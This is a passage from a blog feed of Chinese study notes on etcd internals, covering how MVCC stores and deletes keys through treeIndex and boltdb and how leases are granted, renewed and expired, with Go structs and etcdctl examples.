class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs awk">type keyIndex struct &#123;<br>   key         []byte <span class="hljs-regexp">//</span>用户的key名称，比如我们案例中的<span class="hljs-string">&quot;hello&quot;</span><br>   modified    revision <span class="hljs-regexp">//</span>最后一次修改key时的etcd版本号,比如我们案例中的刚写入hello为world1时的，版本号为<span class="hljs-number">2</span><br>   generations []generation <span class="hljs-regexp">//g</span>eneration保存了一个key若干代版本号信息，每代中包含对key的多次修改的版本号列表<br>&#125;<br><br></code></pre></td></tr></table></figure><p>keyIndex中包含用户的key、最后一次修改key时的etcd版本号、key的若干代（generation）版本号信息，每代中包含对key的多次修改的版本号列表。那我们要如何理解generations？为什么它是个数组呢?</p><p>generations表示一个key从创建到删除的过程，每代对应key的一个生命周期的开始与结束。当你第一次创建一个key时，会生成第0代，后续的修改操作都是在往第0代中追加修改版本号。当你把key删除后，它就会生成新的第1代，一个key不断经历创建、删除的过程，它就会生成多个代。</p><p>generation结构详细信息如下：</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs awk">type generation struct &#123;<br>   ver     int64    <span class="hljs-regexp">//</span>表示此key的修改次数<br>   created revision <span class="hljs-regexp">//</span>表示generation结构创建时的版本号<br>   revs    []revision <span class="hljs-regexp">//</span>每次修改key时的revision追加到此数组<br>&#125;<br><br></code></pre></td></tr></table></figure><p>generation结构中包含此key的修改次数、generation创建时的版本号、对此key的修改版本号记录列表。</p><p>需要注意的是版本号（revision）并不是一个简单的整数，而是一个结构体。revision结构及含义如下：</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs awk">type revision struct &#123;<br>   main int64    <span class="hljs-regexp">//</span> 一个全局递增的主版本号，随put<span class="hljs-regexp">/txn/</span><span class="hljs-keyword">delete</span>事务递增，一个事务内的key main版本号是一致的<br>   sub int64    <span class="hljs-regexp">//</span> 一个事务内的子版本号，从<span class="hljs-number">0</span>开始随事务内put/<span class="hljs-keyword">delete</span>操作递增<br>&#125;<br><br></code></pre></td></tr></table></figure><p>revision包含main和sub两个字段，main是全局递增的版本号，它是个etcd逻辑时钟，随着put&#x2F;txn&#x2F;delete等事务递增。sub是一个事务内的子版本号，从0开始随事务内的put&#x2F;delete操作递增。</p><p>比如启动一个空集群，全局版本号默认为1，执行下面的txn事务，它包含两次put、一次get操作，那么按照我们上面介绍的原理，全局版本号随读写事务自增，因此是main为2，sub随事务内的put&#x2F;delete操作递增，因此key hello的revison为{2,0}，key world的revision为{2,1}。</p><figure class="highlight subunit"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs subunit">$ etcdctl txn -i<br>compares:<br><br><span class="hljs-keyword">success </span>requests (get，put，del):<br>put hello 1<br>get hello<br>put world 2<br><br></code></pre></td></tr></table></figure><p>介绍完treeIndex基本原理、核心数据结构后，再看看在MVCC特性初体验中的更新、查询、删除key案例里，treeIndex与boltdb是如何协作，完成以上key-value操作的?</p><h2 id="MVCC更新key原理"><a href="#MVCC更新key原理" class="headerlink" title="MVCC更新key原理"></a>MVCC更新key原理</h2><p>当我们通过etcdctl发起一个put hello操作时，如下面的put事务流程图流程一所示，在put写事务中，首先它需要从treeIndex模块中查询key的keyIndex索引信息，keyIndex中存储了key的创建版本号、修改的次数等信息，这些信息在事务中发挥着重要作用，因此会存储在boltdb的value中。</p><p>在案例中，因为是第一次创建hello key，此时keyIndex索引为空。</p><p><img src="https://static001.geekbang.org/resource/image/84/e1/84377555cb4150ea7286c9ef3c5e17e1.png?wh=1920*1063" alt="img"></p><p>其次etcd会根据当前的全局版本号（空集群启动时默认为1）自增，生成put hello操作对应的版本号revision{2,0}，这就是boltdb的key。</p><p>boltdb的value是mvccpb.KeyValue结构体，它是由用户key、value、create_revision、mod_revision、version、lease组成。它们的含义分别如下：</p><ul><li>create_revision表示此key创建时的版本号。在我们的案例中，key hello是第一次创建，那么值就是2。当你再次修改key hello的时候，写事务会从treeIndex模块查询hello第一次创建的版本号，也就是keyIndex.generations[i].created字段，赋值给create_revision字段；</li><li>mod_revision表示key最后一次修改时的版本号，即put操作发生时的全局版本号加1；</li><li>version表示此key的修改次数。每次修改的时候，写事务会从treeIndex模块查询hello已经历过的修改次数，也就是keyIndex.generations[i].ver字段，将ver字段值加1后，赋值给version字段。</li></ul><p>填充好boltdb的KeyValue结构体后，这时就可以通过Backend的写事务batchTx接口将key{2,0},value为mvccpb.KeyValue保存到boltdb的缓存中，并同步更新buffer，如上图中的流程二所示。</p><p>此时存储到boltdb中的key、value数据如下：</p><p><img src="D:\桌面\学习资料\17689609062\etcd实战课\images\340226\a245b18eabc86ea83a71349f49bdceba.jpg"></p><p>然后put事务需将本次修改的版本号与用户key的映射关系保存到treeIndex模块中，也就是上图中的流程三。</p><p>因为key hello是首次创建，treeIndex模块它会生成key hello对应的keyIndex对象，并填充相关数据结构。</p><p>keyIndex填充后的结果如下所示：</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">key</span> hello的keyIndex:<br><span class="hljs-attribute">key</span>:     <span class="hljs-string">&quot;hello&quot;</span><br><span class="hljs-attribute">modified</span>: &lt;<span class="hljs-number">2</span>,<span class="hljs-number">0</span>&gt;<br><span class="hljs-attribute">generations</span>:<span class="hljs-meta"></span><br><span class="hljs-meta">[&#123;ver:1,created:&lt;2,0&gt;,revisions: [&lt;2,0&gt;]&#125; ]</span><br><br></code></pre></td></tr></table></figure><p>我们来简易分析一下上面的结果。</p><ul><li>key为hello，modified为最后一次修改版本号&lt;2,0&gt;，key hello是首次创建的，因此新增一个generation代跟踪它的生命周期、修改记录；</li><li>generation的ver表示修改次数，首次创建为1，后续随着修改操作递增；</li><li>generation.created表示创建generation时的版本号为&lt;2,0&gt;；</li><li>revision数组保存对此key修改的版本号列表，每次修改都会将将相应的版本号追加到revisions数组中。</li></ul><p>通过以上流程，一个put操作终于完成。</p><p>但是此时数据还并未持久化，为了提升etcd的写吞吐量、性能，一般情况下（默认堆积的写事务数大于1万才在写事务结束时同步持久化），数据持久化由Backend的异步goroutine完成，它通过事务批量提交，定时将boltdb页缓存中的脏数据提交到持久化存储磁盘中，也就是下图中的黑色虚线框住的流程四。</p><p><img src="https://static001.geekbang.org/resource/image/5d/a2/5de49651cedf4595648aeba3c131cea2.png?wh=1920*1059" alt="img"></p><h2 id="MVCC查询key原理"><a href="#MVCC查询key原理" class="headerlink" title="MVCC查询key原理"></a>MVCC查询key原理</h2><p>完成put hello为world1操作后，这时你通过etcdctl发起一个get hello操作，MVCC模块首先会创建一个读事务对象（TxnRead），在etcd 3.4中Backend实现了ConcurrentReadTx， 也就是并发读特性。</p><p>并发读特性的核心原理是创建读事务对象时，它会全量拷贝当前写事务未提交的buffer数据，并发的读写事务不再阻塞在一个buffer资源锁上，实现了全并发读。</p><p><img src="https://static001.geekbang.org/resource/image/55/ee/55998d8a1f3091076a9119d85e7175ee.png?wh=1920*1070" alt="img"></p><p>如上图所示，在读事务中，它首先需要根据key从treeIndex模块获取版本号，因我们未带版本号读，默认是读取最新的数据。treeIndex模块从B-tree中，根据key查找到keyIndex对象后，匹配有效的generation，返回generation的revisions数组中最后一个版本号{2,0}给读事务对象。</p><p>读事务对象根据此版本号为key，通过Backend的并发读事务（ConcurrentReadTx）接口，优先从buffer中查询，命中则直接返回，否则从boltdb中查询此key的value信息。</p><p>那指定版本号读取历史记录又是怎么实现的呢？</p><p>当你再次发起一个put hello为world2修改操作时，key hello对应的keyIndex的结果如下面所示，keyIndex.modified字段更新为&lt;3,0&gt;，generation的revision数组追加最新的版本号&lt;3,0&gt;，ver修改为2。</p><figure class="highlight gherkin"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs gherkin">key hello的keyIndex:<br>key:     <span class="hljs-string">&quot;hello&quot;</span><br>modified: <span class="hljs-variable">&lt;3,0&gt;</span><br>generations:<br>[&#123;ver:2,created:<span class="hljs-variable">&lt;2,0&gt;</span>,revisions: [<span class="hljs-variable">&lt;2,0&gt;</span>,<span class="hljs-variable">&lt;3,0&gt;</span>]&#125;]<br><br></code></pre></td></tr></table></figure><p>boltdb插入一个新的key revision{3,0}，此时存储到boltdb中的key-value数据如下：</p><p><img src="https://static001.geekbang.org/resource/image/8b/f7/8bec06d61622f2a99ea9dd2f78e693f7.jpg?wh=1432*477" alt="img"></p><p>这时你再发起一个指定历史版本号为2的读请求时，实际是读版本号为2的时间点的快照数据。treeIndex模块会遍历generation内的历史版本号，返回小于等于2的最大历史版本号，在我们这个案例中，也就是revision{2,0}，以它作为boltdb的key，从boltdb中查询出value即可。</p><h2 id="MVCC删除key原理"><a href="#MVCC删除key原理" class="headerlink" title="MVCC删除key原理"></a>MVCC删除key原理</h2><p>介绍完MVCC更新、查询key的原理后，我们接着往下看。当你执行etcdctl del hello命令时，etcd会立刻从treeIndex和boltdb中删除此数据吗？还是增加一个标记实现延迟删除（lazy delete）呢？</p><p>答案为etcd实现的是<strong>延期删除模式</strong>，原理与key更新类似。</p><p>与更新key不一样之处在于，一方面，生成的boltdb key版本号{4,0,t}追加了删除标识（tombstone,简写t），boltdb value变成只含用户key的KeyValue结构体。另一方面treeIndex模块也会给此key hello对应的keyIndex对象，追加一个空的generation对象，表示此索引对应的key被删除了。</p><p>当你再次查询hello的时候，treeIndex模块根据key hello查找到keyindex对象后，若发现其存在空的generation对象，并且查询的版本号大于等于被删除时的版本号，则会返回空。</p><p>etcdctl hello操作后的keyIndex的结果如下面所示：</p><figure class="highlight gherkin"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs gherkin">key hello的keyIndex:<br>key:     <span class="hljs-string">&quot;hello&quot;</span><br>modified: <span class="hljs-variable">&lt;4,0&gt;</span><br>generations:<br>[<br>&#123;ver:3,created:<span class="hljs-variable">&lt;2,0&gt;</span>,revisions: [<span class="hljs-variable">&lt;2,0&gt;</span>,<span class="hljs-variable">&lt;3,0&gt;</span>,<span class="hljs-variable">&lt;4,0&gt;</span>(t)]&#125;，<br>&#123;empty&#125;<br>]<br><br></code></pre></td></tr></table></figure><p>boltdb此时会插入一个新的key revision{4,0,t}，此时存储到boltdb中的key-value数据如下：</p><p><img src="https://static001.geekbang.org/resource/image/da/17/da4e5bc5033619dda296c022ac6yyc17.jpg?wh=1611*581" alt="img"></p><p><strong>那么key打上删除标记后有哪些用途呢？什么时候会真正删除它呢？</strong></p><p>一方面删除key时会生成events，Watch模块根据key的删除标识，会生成对应的Delete事件。</p><p>另一方面，当你重启etcd，遍历boltdb中的key构建treeIndex内存树时，你需要知道哪些key是已经被删除的，并为对应的key索引生成tombstone标识。而真正删除treeIndex中的索引对象、boltdb中的key是通过压缩(compactor)组件异步完成。</p><p>正因为etcd的删除key操作是基于以上延期删除原理实现的，因此只要压缩组件未回收历史版本，我们就能从etcd中找回误删的数据。</p><h2 id="小结"><a href="#小结" class="headerlink" title="小结"></a>小结</h2><p>treeIndex模块基于Google开源的btree库实现，它的核心数据结构keyIndex，保存了用户key与版本号关系。每次修改key都会生成新的版本号，生成新的boltdb key-value。boltdb的key为版本号，value包含用户key-value、各种版本号、lease的mvccpb.KeyValue结构体。</p><p>当未带版本号查询key时，etcd返回的是key最新版本数据。当你指定版本号读取数据时，etcd实际上返回的是版本号生成那个时间点的快照数据。</p><p>删除一个数据时，etcd并未真正删除它，而是基于lazy delete实现的异步删除。删除原理本质上与更新操作类似，只不过boltdb的key会打上删除标记，keyIndex索引中追加空的generation。真正删除key是通过etcd的压缩组件去异步实现的，在后面的课程里我会继续和你深入介绍。</p><p>基于以上原理特性的实现，etcd实现了保存key历史版本的功能，是高可靠Watch机制的基础。基于key-value中的各种版本号信息，etcd可提供各种级别的简易事务隔离能力。基于Backend&#x2F;boltdb提供的MVCC机制，etcd可实现读写不冲突。</p><h2 id="思考题"><a href="#思考题" class="headerlink" title="思考题"></a>思考题</h2><p>你认为etcd为什么删除使用lazy delete方式呢？ 相比同步delete,各有什么优缺点？当你突然删除大量key后，db大小是立刻增加还是减少呢？</p><p>1是为了保证key对应的watcher能够获取到key的所有状态信息，留给watcher时间做相应的处理。2是实时从boltdb删除key，会可能触发树的不平衡，影响其他读写请求的性能。3.增大。</p>]]></content>
    
    
    <categories>
      
      <category>etcd</category>
      
    </categories>
    
    
    <tags>
      
      <tag>原创</tag>
      
      <tag>etcd</tag>
      
      <tag>笔记</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>06.租约：如何检测你的客户端存活？</title>
    <link href="/2022/10/04/06-%E7%A7%9F%E7%BA%A6%EF%BC%9A%E5%A6%82%E4%BD%95%E6%A3%80%E6%B5%8B%E4%BD%A0%E7%9A%84%E5%AE%A2%E6%88%B7%E7%AB%AF%E5%AD%98%E6%B4%BB%EF%BC%9F/"/>
    <url>/2022/10/04/06-%E7%A7%9F%E7%BA%A6%EF%BC%9A%E5%A6%82%E4%BD%95%E6%A3%80%E6%B5%8B%E4%BD%A0%E7%9A%84%E5%AE%A2%E6%88%B7%E7%AB%AF%E5%AD%98%E6%B4%BB%EF%BC%9F/</url>
    
    <content type="html"><![CDATA[<h1 id="06-租约：如何检测你的客户端存活？"><a href="#06-租约：如何检测你的客户端存活？" class="headerlink" title="06.租约：如何检测你的客户端存活？"></a>06.租约：如何检测你的客户端存活？</h1><blockquote><p>本文笔记来自：「极客时间ETCD实战课」，原文链接：<a href="https://time.geekbang.org/column/article/354292?cid=100069901">https://time.geekbang.org/column/article/354292?cid=100069901</a></p></blockquote><p>etcd的一个典型的应用场景是Leader选举，那么etcd为什么可以用来实现Leader选举？核心特性实现原理又是怎样的？</p><h2 id="什么是Lease"><a href="#什么是Lease" class="headerlink" title="什么是Lease"></a>什么是Lease</h2><p>在实际业务场景中，常常会遇到类似Kubernetes的调度器、控制器组件同一时刻只能存在一个副本对外提供服务的情况。然而单副本部署的组件，是无法保证其高可用性的。</p><p>那为了解决单副本的可用性问题，我们就需要多副本部署。同时，为了保证同一时刻只有一个能对外提供服务，我们需要引入Leader选举机制。那么Leader选举本质是要解决什么问题呢？</p><p>首先当然是要保证Leader的唯一性，确保集群不出现多个Leader，才能保证业务逻辑准确性，也就是安全性（Safety）、互斥性。</p><p>其次是主节点故障后，备节点应可快速感知到其异常，也就是<strong>活性（liveness）检测</strong>。实现活性检测主要有两种方案。</p><p>方案一为<strong>被动型检测</strong>，你可以通过探测节点定时拨测Leader节点，看是否健康，比如Redis Sentinel。</p><p>方案二为<strong>主动型上报</strong>，Leader节点可定期向协调服务发送”特殊心跳”汇报健康状态，若其未正常发送心跳，并超过和协调服务约定的最大存活时间后，就会被协调服务移除Leader身份标识。同时其他节点可通过协调服务，快速感知到Leader故障了，进而发起新的选举。</p><p>我们文章的主题，<strong>Lease，正是基于主动型上报模式</strong>， <strong>提供的一种活性检测机制</strong>。Lease顾名思义，client和etcd server之间存在一个约定，内容是etcd server保证在约定的有效期内（TTL），不会删除你关联到此Lease上的key-value。</p><p>若未在有效期内续租，那么etcd server就会删除Lease和其关联的key-value。</p><p>你可以基于Lease的TTL特性，解决类似Leader选举、Kubernetes Event自动淘汰、服务发现场景中故障节点自动剔除等问题。为了帮助理解Lease的核心特性原理，以一个实际场景中的经常遇到的异常节点自动剔除为案例，围绕这个问题，深入介绍Lease特性的实现。</p><p>在这个案例中，期望的效果是，在节点异常时，表示节点健康的key能被从etcd集群中自动删除。</p><h2 id="Lease整体架构"><a href="#Lease整体架构" class="headerlink" title="Lease整体架构"></a>Lease整体架构</h2><p>Lease模块简要架构图。</p><p><img src="https://static001.geekbang.org/resource/image/ac/7c/ac70641fa3d41c2dac31dbb551394b7c.png?wh=2464*1552" alt="img"></p><p>etcd在启动的时候，创建Lessor模块的时候，它会启动两个常驻goroutine，如上图所示，一个是RevokeExpiredLease任务，定时检查是否有过期Lease，发起撤销过期的Lease操作。一个是CheckpointScheduledLease，定时触发更新Lease的剩余到期时间的操作。</p><p>Lessor模块提供了Grant、Revoke、LeaseTimeToLive、LeaseKeepAlive API给client使用，各接口作用如下:</p><ul><li>Grant表示创建一个TTL为你指定秒数的Lease，Lessor会将Lease信息持久化存储在boltdb中；</li><li>Revoke表示撤销Lease并删除其关联的数据；</li><li>LeaseTimeToLive表示获取一个Lease的有效期、剩余时间；</li><li>LeaseKeepAlive表示为Lease续期。</li></ul><h2 id="key如何关联Lease"><a href="#key如何关联Lease" class="headerlink" title="key如何关联Lease"></a>key如何关联Lease</h2><p>如何基于Lease特性实现检测一个节点存活。</p><p>首先如何为节点健康指标创建一个租约、并与节点健康指标key关联呢?</p><p>如KV模块的一样，client可通过clientv3库的Lease API发起RPC调用，可以使用如下的etcdctl命令为node的健康状态指标，创建一个Lease，有效期为600秒。然后通过timetolive命令，查看Lease的有效期、剩余时间。</p><figure class="highlight crystal"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs crystal"><span class="hljs-comment"># 创建一个TTL为600秒的lease，etcd server返回LeaseID</span><br><span class="hljs-variable">$ </span>etcdctl lease grant <span class="hljs-number">600</span><br>lease <span class="hljs-number">326975935</span>f48f814 granted <span class="hljs-keyword">with</span> TTL(<span class="hljs-number">600</span>s)<br><br><span class="hljs-comment"># 查看lease的TTL、剩余时间</span><br><span class="hljs-variable">$ </span>etcdctl lease timetolive <span class="hljs-number">326975935</span>f48f814<br>lease <span class="hljs-number">326975935</span>f48f814 granted <span class="hljs-keyword">with</span> TTL(<span class="hljs-number">600</span>s)， remaining(<span class="hljs-number">590</span>s)<br><br></code></pre></td></tr></table></figure><p>当Lease server收到client的创建一个有效期600秒的Lease请求后，会通过Raft模块完成日志同步，随后Apply模块通过Lessor模块的Grant接口执行日志条目内容。</p><p>首先Lessor的Grant接口会把Lease保存到内存的ItemMap数据结构中，然后它需要持久化Lease，将Lease数据保存到boltdb的Lease bucket中，返回一个唯一的LeaseID给client。</p><p>通过这样一个流程，就基本完成了Lease的创建。那么节点的健康指标数据如何关联到此Lease上呢？</p><p>很简单，KV模块的API接口提供了一个”–lease”参数，你可以通过如下命令，将key node关联到对应的LeaseID上。然后你查询的时候增加-w参数输出格式为json，就可查看到key关联的LeaseID。</p><figure class="highlight crmsh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs crmsh">$ etcdctl put <span class="hljs-keyword">node</span> <span class="hljs-title">healthy</span> --lease <span class="hljs-number">326975935</span>f48f818<br>OK<br>$ etcdctl get <span class="hljs-keyword">node</span> <span class="hljs-title">-w</span>=json | python -m json.tool<br>&#123;<br>    <span class="hljs-string">&quot;kvs&quot;</span>:[<br>        &#123;<br>            <span class="hljs-string">&quot;create_revision&quot;</span>:<span class="hljs-number">24</span>，<br>            <span class="hljs-string">&quot;key&quot;</span>:<span class="hljs-string">&quot;bm9kZQ==&quot;</span>，<br>            <span class="hljs-string">&quot;Lease&quot;</span>:<span class="hljs-number">3632563850270275608</span>，<br>            <span class="hljs-string">&quot;mod_revision&quot;</span>:<span class="hljs-number">24</span>，<br>            <span class="hljs-string">&quot;value&quot;</span>:<span class="hljs-string">&quot;aGVhbHRoeQ==&quot;</span>，<br>            <span class="hljs-string">&quot;version&quot;</span>:<span class="hljs-number">1</span><br>        &#125;<br>    ]<br>&#125;<br><br></code></pre></td></tr></table></figure><p>以上流程原理如下图所示，它描述了用户的key是如何与指定Lease关联的。当你通过put等命令新增一个指定了”–lease”的key时，MVCC模块它会通过Lessor模块的Attach方法，将key关联到Lease的key内存集合ItemSet中。</p><p><img src="https://static001.geekbang.org/resource/image/aa/ee/aaf8bf5c3841a641f8c51fcc34ac67ee.png?wh=2024*1450" alt="img"></p><p>一个Lease关联的key集合是保存在内存中的，那么etcd重启时，是如何知道每个Lease上关联了哪些key呢?</p><p>答案是etcd的MVCC模块在持久化存储key-value的时候，保存到boltdb的value是个结构体（mvccpb.KeyValue）， 它不仅包含你的key-value数据，还包含了关联的LeaseID等信息。因此当etcd重启时，可根据此信息，重建关联各个Lease的key集合列表。</p><h2 id="如何优化Lease续期性能"><a href="#如何优化Lease续期性能" class="headerlink" title="如何优化Lease续期性能"></a>如何优化Lease续期性能</h2><p>通过以上流程，我们完成了Lease创建和数据关联操作。在正常情况下，你的节点存活时，需要定期发送KeepAlive请求给etcd续期健康状态的Lease，否则你的Lease和关联的数据就会被删除。</p><p>那么Lease是如何续期的? 作为一个高频率的请求API，etcd如何优化Lease续期的性能呢？</p><p>Lease续期其实很简单，核心是将Lease的过期时间更新为当前系统时间加其TTL。关键问题在于续期的性能能否满足业务诉求。</p><p>然而影响续期性能因素又是源自多方面的。首先是TTL，TTL过长会导致节点异常后，无法及时从etcd中删除，影响服务可用性，而过短，则要求client频繁发送续期请求。其次是Lease数，如果Lease成千上万个，那么etcd可能无法支撑如此大规模的Lease数，导致高负载。</p><p>如何解决呢？</p><p>首先我们回顾下早期etcd v2版本是如何实现TTL特性的。在早期v2版本中，没有Lease概念，TTL属性是在key上面，为了保证key不删除，即便你的TTL相同，client也需要为每个TTL、key创建一个HTTP&#x2F;1.x 连接，定时发送续期请求给etcd server。</p><p>很显然，v2老版本这种设计，因不支持连接多路复用、相同TTL无法复用导致性能较差，无法支撑较大规模的Lease场景。</p><p>etcd v3版本为了解决以上问题，提出了Lease特性，TTL属性转移到了Lease上， 同时协议从HTTP&#x2F;1.x优化成gRPC协议。</p><p>一方面不同key若TTL相同，可复用同一个Lease， 显著减少了Lease数。另一方面，通过gRPC HTTP&#x2F;2实现了多路复用，流式传输，同一连接可支持为多个Lease续期，大大减少了连接数。</p><p>通过以上两个优化，实现Lease性能大幅提升，满足了各个业务场景诉求。</p><h2 id="如何高效淘汰过期Lease"><a href="#如何高效淘汰过期Lease" class="headerlink" title="如何高效淘汰过期Lease"></a>如何高效淘汰过期Lease</h2><p>在了解完节点正常情况下的Lease续期特性后，再看看节点异常时，未正常续期后，etcd又是如何淘汰过期Lease、删除节点健康指标key的。</p><p>淘汰过期Lease的工作由Lessor模块的一个异步goroutine负责。如下面架构图虚线框所示，它会定时从最小堆中取出已过期的Lease，执行删除Lease和其关联的key列表数据的RevokeExpiredLease任务。</p><p><img src="https://static001.geekbang.org/resource/image/b0/6b/b09e9d30157876b031ed206391698c6b.png?wh=2552*1550" alt="img"></p><p>从图中可以看到，目前etcd是基于最小堆来管理Lease，实现快速淘汰过期的Lease。</p><p>etcd早期的时候，淘汰Lease非常暴力。etcd会直接遍历所有Lease，逐个检查Lease是否过期，过期则从Lease关联的key集合中，取出key列表，删除它们，时间复杂度是O(N)。</p><p>然而这种方案随着Lease数增大，毫无疑问它的性能会变得越来越差。我们能否按过期时间排序呢？这样每次只需轮询、检查排在前面的Lease过期时间，一旦轮询到未过期的Lease， 则可结束本轮检查。</p><p>刚刚说的就是etcd Lease高效淘汰方案最小堆的实现方法。每次新增Lease、续期的时候，它会插入、更新一个对象到最小堆中，对象含有LeaseID和其到期时间unixnano，对象之间按到期时间升序排序。</p><p>etcd Lessor主循环每隔500ms执行一次撤销Lease检查（RevokeExpiredLease），每次轮询堆顶的元素，若已过期则加入到待淘汰列表，直到堆顶的Lease过期时间大于当前，则结束本轮轮询。</p><p>相比早期O(N)的遍历时间复杂度，使用堆后，插入、更新、删除，它的时间复杂度是O(Log N)，查询堆顶对象是否过期时间复杂度仅为O(1)，性能大大提升，可支撑大规模场景下Lease的高效淘汰。</p><p>获取到待过期的LeaseID后，Leader是如何通知其他Follower节点淘汰它们呢？</p><p>Lessor模块会将已确认过期的LeaseID，保存在一个名为expiredC的channel中，而etcd server的主循环会定期从channel中获取LeaseID，发起revoke请求，通过Raft Log传递给Follower节点。</p><p>各个节点收到revoke Lease请求后，获取关联到此Lease上的key列表，从boltdb中删除key，从Lessor的Lease map内存中删除此Lease对象，最后还需要从boltdb的Lease bucket中删除这个Lease。</p><p>以上就是Lease的过期自动淘汰逻辑。Leader节点按过期时间维护了一个最小堆，若你的节点异常未正常续期，那么随着时间消逝，对应的Lease则会过期，Lessor主循环定时轮询过期的Lease。获取到ID后，Leader发起revoke操作，通知整个集群删除Lease和关联的数据。</p><h2 id="为什么需要checkpoint机制"><a href="#为什么需要checkpoint机制" class="headerlink" title="为什么需要checkpoint机制"></a>为什么需要checkpoint机制</h2><p>了解完Lease的创建、续期、自动淘汰机制后，可能已经发现，检查Lease是否过期、维护最小堆、针对过期的Lease发起revoke操作，都是Leader节点负责的，它类似于Lease的仲裁者，通过以上清晰的权责划分，降低了Lease特性的实现复杂度。</p><p>那么当Leader因重启、crash、磁盘IO等异常不可用时，Follower节点就会发起Leader选举，新Leader要完成以上职责，必须重建Lease过期最小堆等管理数据结构，那么以上重建可能会触发什么问题呢？</p><p>当你的集群发生Leader切换后，新的Leader基于Lease map信息，按Lease过期时间构建一个最小堆时，etcd早期版本为了优化性能，并未持久化存储Lease剩余TTL信息，因此重建的时候就会自动给所有Lease自动续期了。</p><p>然而若较频繁出现Leader切换，切换时间小于Lease的TTL，这会导致Lease永远无法删除，大量key堆积，db大小超过配额等异常。</p><p>为了解决这个问题，etcd引入了检查点机制，也就是下面架构图中黑色虚线框所示的CheckPointScheduledLeases的任务。</p><p><img src="https://static001.geekbang.org/resource/image/70/59/70ece2fa3bc400edd8d3b09f752ea759.png?wh=2580*1560" alt="img"></p><p>一方面，etcd启动的时候，Leader节点后台会运行此异步任务，定期批量地将Lease剩余的TTL基于Raft Log同步给Follower节点，Follower节点收到CheckPoint请求后，更新内存数据结构LeaseMap的剩余TTL信息。</p><p>另一方面，当Leader节点收到KeepAlive请求的时候，它也会通过checkpoint机制把此Lease的剩余TTL重置，并同步给Follower节点，尽量确保续期后集群各个节点的Lease 剩余TTL一致性。</p><p>最后要注意的是，此特性对性能有一定影响，目前仍然是试验特性。可以通过<strong>experimental-enable-lease-checkpoint</strong>参数开启。</p><h2 id="小结"><a href="#小结" class="headerlink" title="小结"></a>小结</h2><p>Lease的核心是TTL，当Lease的TTL过期时，它会自动删除其关联的key-value数据。</p><p>首先是Lease创建及续期。当你创建Lease时，etcd会保存Lease信息到boltdb的Lease bucket中。为了防止Lease被淘汰，你需要定期发送LeaseKeepAlive请求给etcd server续期Lease，本质是更新Lease的到期时间。</p><p>续期的核心挑战是性能，etcd经历了从TTL属性在key上，到独立抽象出Lease，支持多key复用相同TTL，同时协议从HTTP&#x2F;1.x优化成gRPC协议，支持多路连接复用，显著降低了server连接数等资源开销。</p><p>其次是Lease的淘汰机制，etcd的Lease淘汰算法经历了从时间复杂度O(N)到O(Log N)的演进，核心是轮询最小堆的Lease是否过期，若过期生成revoke请求，它会清理Lease和其关联的数据。</p><p>最后介绍了Lease的checkpoint机制，它是为了解决Leader异常情况下TTL自动被续期，可能导致Lease永不淘汰的问题而诞生。</p>]]></content>
    
    
    <categories>
      
      <category>etcd</category>
      
    </categories>
    
    
    <tags>
      
      <tag>原创</tag>
      
      <tag>etcd</tag>
      
      <tag>笔记</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>05.鉴权：如何保护你的数据安全？</title>
    <link href="/2022/10/03/05-%E9%89%B4%E6%9D%83%EF%BC%9A%E5%A6%82%E4%BD%95%E4%BF%9D%E6%8A%A4%E4%BD%A0%E7%9A%84%E6%95%B0%E6%8D%AE%E5%AE%89%E5%85%A8%EF%BC%9F/"/>
    <url>/2022/10/03/05-%E9%89%B4%E6%9D%83%EF%BC%9A%E5%A6%82%E4%BD%95%E4%BF%9D%E6%8A%A4%E4%BD%A0%E7%9A%84%E6%95%B0%E6%8D%AE%E5%AE%89%E5%85%A8%EF%BC%9F/</url>
    
